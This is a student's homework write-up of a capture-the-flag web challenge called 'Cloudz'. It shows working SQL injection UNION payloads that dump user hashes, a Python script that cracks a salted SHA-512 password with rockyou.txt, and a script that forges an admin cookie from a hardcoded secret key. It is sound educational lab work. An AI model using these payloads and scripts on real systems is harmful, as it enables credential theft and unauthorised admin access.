# Homework #2 Write-up

## Personal Details  
Full name: **Theodoros Moraitis** (Θεόδωρος Μωραΐτης) <br>
StudentID: **sdi2000150** (1115202000150) <br>
HackCenter username: **teomor** (provided in the `username` file too)

## Intro
In this write-up, I describe how I solved one of the most interesting challenges from the second Capture-The-Flag (CTF) Competition (Cryptography & Web Exploitation).
The challenge I am referring to is **Cloudz**.

## Cloudz: SQL Injection + Password Hash Cracking + Cookie Forgery

**Cloudz** is a web-exploitation challenge where the goal is to log-in as admin and get the flag revealed. Based on the description, admin account is deleted, so there must be another way to obtain admin's privileges even if not logged in as admin. The Python server source code was provided, giving insight into its authentication mechanism.

### Key Observations/Vulnerabilities from Source Code (`server.py`)

I observed the below, in this order:

1. The login endpoint is **vulnerable to an SQL injection**, as no sanitization is used:
   ```python
   result = c.execute("SELECT name, password, admin FROM users WHERE name ='%s';" %  user).fetchone()
   ```

2. Passwords were stored as SHA-512 hashes with a **fixed salt** (`salt = b'no_google_for_you'`), meaning a hashed password could be easily cracked.

2. Cookie integrity was protected with a **hardcoded secret key** (`app.secret_key = b'312edc37ea3f3f8d80c4a2c9752ae367'`), meaning if the key is known (as it is in this challenge), anyone can forge cookies.

### Exploitation Steps

#### 1. **SQL Injection**

At first I focused on the SQL injection. I knew I could someway obtain useful information from the database, so I tested with `UNION`. I observed that giving the following query as username, with any password:
```sql
' UNION SELECT name, password, admin FROM users;--
```
It returned a JSON:
```JSON
{
  "error": "You're not Adam Racine!"
}
```
A user! Maybe the first one from the table `users`. But it did not give me his password. <br> <br>
After many attempts and a lot of online research, I found this very useful query:
```sql
' UNION SELECT name || password || admin, NULL, NULL FROM users;--
```
, which combines multiple columns (name, password, admin) into one, using string concatenation. The `NULL, NULL` parts fill the rest of the expected columns so the query structure stays valid. <br> <br>
To make it more readable, I did:
```sql
' UNION SELECT name || '~' || password || '~' || admin, NULL, NULL FROM users;--
```
Giving the above query as username, and anything as password, I got as answer a JSON:
```JSON
{
  "error": "You're not Adam Racine~d77ea67d8b7fffd49c0c5fe6a790c117f1fc51bd7cece8abaee4e58abcbc97e5381de7edc698edba9e25927801f257250cb8d01f85245d33863f3654cf709327~0!"
}
```
From the above we can cleary see the user's password hash (`d77ea67d8b7fffd49c0c5fe6a790c117f1fc51bd7cece8abaee4e58abcbc97e5381de7edc698edba9e25927801f257250cb8d01f85245d33863f3654cf709327`) and his admin bit (`0`).

#### 2. **User Password Hash Cracking**

So, I now had a user and his hashed password. Keeping in mind the hint *"People are bad at passwords."* plus the fact that the salt used for the password hashing was known (`"no_google_for_you"`), I thought to try a **brute-force**:
*hashing with this specific salt each and all words from `rockyou.txt` and comparing each result hash with the hashed password from the user above.* <br>
This is the python script I used: <br>
```python
import hashlib

# Known salt from source
salt = b'no_google_for_you'

# Known password hash from previous step
target_hash = "d77ea67d8b7fffd49c0c5fe6a790c117f1fc51bd7cece8abaee4e58abcbc97e5381de7edc698edba9e25927801f257250cb8d01f85245d33863f3654cf709327"

# Brute force with rockyou.txt
with open("/home/teomor/Documents/my_programs/hackintro/Homework#2/cryptography/rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        test_hash = hashlib.sha512(salt + password.encode()).hexdigest()
        if test_hash == target_hash:
            print(f"Password found: {password}")
            break
```
After running the script I got:
```bash
Password found: july31
```
So, I had the user's credentials! Now I could login as this user, but...<br>
Unfortunately logging in as user doesn't give you any flag, you are just a regular user - not admin:
```html
    Welcome Adam Racine!
    You need to be admin to do anything here
```

#### 3. **Admin Cookie Forgery**

There should be a way, being logged in as user, to get admin privileges and obtain the flag. With a little of discussion with my fellows and some research, I found that I could create ("forge") a new cookie that belongs to `Adam Racine` but it acts as `admin`.
Knowing the known secret key and user's username and password, I forged a cookie with `"admin": 1` manually, with this python script:
```python
import json, hashlib, binascii

# User login info
user = "Adam Racine"
password = "july31"
admin = 1

secret_key = b'312edc37ea3f3f8d80c4a2c9752ae367'

# Cookie struct
cookie = {
    "user": user,
    "password": password,
    "admin": admin
}

# Calculate digest for the cookie
digest = hashlib.sha512(secret_key + json.dumps(cookie, sort_keys=True).encode()).hexdigest()
cookie["digest"] = digest

# Convert to hex cookie string
cookie_str = json.dumps(cookie).encode()
hex_cookie = binascii.hexlify(cookie_str).decode()

print("Manual admin cookie created:\n")
print(hex_cookie)
```
After running the script I got:
```bash
Manual admin cookie created:

7b2275736572223a20224164616d20526163696e65222c202270617373776f7264223a20226a756c793331222c202261646d696e223a20312c2022646967657374223a20223039383363303033656239306661336337626533323361313066343432333231363137396637363131323665336239656137346631326534623139643939313834336638343761336538616135343863393936663733633633373337313962353737396438373262336564663533626565663032653961323161646639323730227d
```

#### 4. **Outcome**

Having a manually crafted cookie of our user, with admin bit set to 1, now I opened developer tools on the browser, while being logged in as `Adam Racine` with password `july31`, and I edited the `auth` cookie into the new one created previously. Then with just a refresh on the page, I got:
```html
    Welcome Adam Racine!
    Welcome admin! here is the flag: ece18f77edae9403cde875aa62eae0f8
```
I finally gained the flag! `ece18f77edae9403cde875aa62eae0f8`

## Resources
- About SQL Injection:
    - https://www.techonthenet.com/sqlite/functions/concatenate.php 
    - https://portswigger.net/web-security/sql-injection/union-attacks
    - https://sudip-says-hi.medium.com/union-based-sql-injection-guide-to-understanding-mitigating-such-attacks-1775149e80e6
- About User Password Hash Cracking:
    - https://medium.com/rangeforce/password-cracking-6d9612915f03
    - `rockyou.txt`
- About Admin Cookie Forgery:
    - https://ldvargas.medium.com/hackpackctf-cookie-forge-3d922862d383
